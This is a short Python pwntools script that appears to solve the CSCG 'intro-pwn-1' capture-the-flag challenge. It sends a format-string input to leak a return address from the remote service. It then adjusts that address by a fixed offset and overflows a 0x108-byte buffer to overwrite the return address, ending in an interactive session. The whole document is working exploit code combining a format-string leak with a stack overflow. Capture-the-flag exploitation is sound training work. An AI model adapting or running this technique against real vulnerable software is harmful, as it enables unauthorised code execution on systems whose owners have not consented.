from pwn import *

p = remote("7b000000061dcb073e8d1739-intro-pwn-1.challenge.broker.cscg.live", 31337, ssl = True)

p.recvuntil("Enter your witch name:")
p.sendline("#%39$p#")

p.recvuntil("#")
leak = p.recvuntil("#")
leak = int(leak[:-1], 16)

log.info(f"Leaked ret address: {leak:#x}")

p.recvuntil(":")

leak += 0x9ed - 0xb21
log.info(f"Overriding with: {leak:#x}")

payload = b"Expelliarmus\0".ljust(0x108) + p64(leak)
p.sendline(payload)
p.interactive()
